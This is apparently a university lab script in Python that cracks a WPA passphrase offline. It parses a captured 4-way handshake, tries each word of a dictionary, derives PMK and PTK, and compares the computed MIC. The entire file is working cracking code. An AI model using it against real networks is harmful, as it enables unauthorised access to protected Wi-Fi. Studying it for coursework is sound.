#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
- Derive WPA keys from Passphrase and 4-way handshake info

- Calculate an authentication MIC (the mic for data transmission uses the
Michael algorithm. In the case of authentication, we use SHA-1 or MD5)
"""


__author__      = "Abraham Rubinstein"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2_math import pbkdf2_hex #contains function to calculate 4096 rounds on passphrase and SSID
from numpy import array_split
from numpy import array
import hmac, hashlib
import string

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = ''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+chr(0x00)+B+chr(i),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, open authentication, associacion, 4-way handshake and data
wpa=rdpcap("wpa_handshake.cap") 

# Important parameters for key derivation - some of them can be obtained from the pcap file
dictionary  = "francais.txt" #this is the dictionary containing all words to test
A           = "Pairwise key expansion" #this string is used in the pseudo-random function and should never be modified

## ssid is obtained from the info of the beacon packet
ssid        = wpa[0].info
## APmac is obtained from the sender address of the beacon packet
APmac       = a2b_hex(wpa[0].addr2.replace(':','')) #MAC address of the AP
## Clientmac is obtained from the receiver address of the first authentication packet
Clientmac   = a2b_hex(wpa[1].addr1.replace(':','')) #MAC address of the client

# Authenticator and Supplicant Nonces
## ANonce is extracted from the payload of the first message of the 4-way handshake
ANonce      = a2b_hex(wpa[5].load.encode("hex")[26:90])
## ANonce is extracted from the payload of the second message of the 4-way handshake
SNonce      = a2b_hex(wpa[6].load.encode("hex")[26:90])

# This is the MIC contained in the 4th frame of the 4-way handshake. I copied it by hand.
# When trying to crack the WPA passphrase, we will compare it to our own MIC calculated using passphrases from a dictionary
## The mic to test is extracted from the last message of the 4-way handshake
mic_to_test = wpa[8].load.encode("hex")[154:186]

B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

# Take a good look at the contents of this variable. Compare it to the Wireshark last message of the 4-way handshake.
# In particular, look at the last 16 bytes. Read "Important info" in the lab assignment for explanation

## data is extracted from the EAPOL packet information, as well as the payload data of the final 4-way handshake message
data_src = '{:02x}{:02x}{:04x}'.format(wpa[8][EAPOL].version, wpa[8][EAPOL].type, wpa[8][EAPOL].len) + wpa[8].load.encode('hex')
## we must clear the included 16 byte MIC, for it to be the proper data format
data_src = string.replace(data_src, data_src[162:194], "00"*16)
data        = a2b_hex(data_src) 

print "\n\nValues used to derivate keys"
print "============================"
print "Word list: ",dictionary,"\n"
print "SSID: ",ssid,"\n"
print "AP Mac: ",b2a_hex(APmac),"\n"
print "CLient Mac: ",b2a_hex(Clientmac),"\n"
print "AP Nonce: ",b2a_hex(ANonce),"\n"
print "Client Nonce: ",b2a_hex(SNonce),"\n"

fh = open(dictionary)
count = 0

for passPhrase in fh: 
    passPhrase = passPhrase.strip('\n')

    count = count + 1
    if count % 100 == 1 :
        print("words attempted : " + str(count - 1) + ", current word : \"" + passPhrase + "\"")

    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    pmk = pbkdf2_hex(passPhrase, ssid, 4096, 32)

    #expand pmk to obtain PTK
    ptk = customPRF512(a2b_hex(pmk),A,B)

    #calculate our own MIC over EAPOL payload - The ptk is, in fact, KCK|KEK|TK|MICK
    mic = hmac.new(ptk[0:16],data,hashlib.sha1)

    #the MIC for the authentication is actually truncated to 16 bytes (32 chars). SHA-1 is 20 bytes long.
    MIC_hex_truncated = mic.hexdigest()[0:32]

    ## if the computed MIC matches the given MIC, we're done, otherwise, we loop again
    if MIC_hex_truncated != mic_to_test:
        continue
    print "FOUND A KEY : \"" + passPhrase + "\""
         
    #separate ptk into different keys - represent in hex
    KCK = b2a_hex(ptk[0:16])
    KEK = b2a_hex(ptk[16:32])
    TK  = b2a_hex(ptk[32:48])
    MICK = b2a_hex(ptk[48:64])
    

    print "\nResults of the key expansion"
    print "============================="
    print "PMK:\t\t",pmk,"\n"
    print "PTK:\t\t",b2a_hex(ptk),"\n"
    print "KCK:\t\t",KCK,"\n"
    print "KEK:\t\t",KEK,"\n"
    print "TK:\t\t",TK,"\n"
    print "MICK:\t\t",MICK,"\n"
    print "MIC:\t\t",MIC_hex_truncated,"\n"
    exit(0)
